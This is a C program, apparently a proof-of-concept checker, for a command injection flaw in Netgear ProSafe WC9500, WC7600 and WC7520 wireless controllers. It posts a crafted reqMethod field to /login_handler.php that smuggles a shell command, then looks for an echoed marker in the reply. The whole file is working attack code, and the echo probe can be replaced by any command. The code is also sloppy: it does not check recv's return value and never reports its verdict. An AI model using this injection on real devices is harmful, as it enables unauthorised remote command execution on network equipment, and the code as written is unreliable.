// Netgear ProSafe WC9500, Netgear ProSafe WC7600, Netgear ProSafe WC7520

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 4096

// Функция для отправки HTTP POST-запроса
char* http_post(const char *target_ip, int port, const char *data) {
    int sock;
    struct sockaddr_in server_addr;
    char request[BUFFER_SIZE];
    char response[BUFFER_SIZE];
    int bytes_received;

    // Создание сокета
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Настройка адреса сервера
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Подключение к серверу
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return NULL;
    }

    // Формирование HTTP POST-запроса
    snprintf(request, sizeof(request),
             "POST /login_handler.php HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Content-Length: %zu\r\n"
             "\r\n"
             "%s", target_ip, strlen(data), data);

    // Отправка запроса
    send(sock, request, strlen(request), 0);

    // Чтение ответа
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    response[bytes_received] = '\0'; // Завершение строки

    // Закрытие сокета
    close(sock);

    // Возвращение ответа
    return strdup(response); // Копируем строку для возврата
}

// Функция для проверки уязвимости
int check_vulnerability(const char *target_ip, int port) {
    char mark[32];
    snprintf(mark, sizeof(mark), "MARK_%d", rand()); // Генерация метки
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "reqMethod=json_cli_reqMethod\" \"json_cli_jsonData\";%s; echo %s", "echo", mark);

    char *response = http_post(target_ip, port, cmd);
    if (response == NULL) {
        return 0; // Ошибка при выполнении запроса
    }

    // Проверка наличия метки в ответе
    int is_vulnerable = strstr(response, mark) != NULL;
    free(response); // Освобождение памяти
    return is_vulnerable; // Возвращаем результат проверки
}

// Основная функция
int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <target_ip> <target_port>\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    check_vulnerability(target_ip, target_port);

    return 0;
}
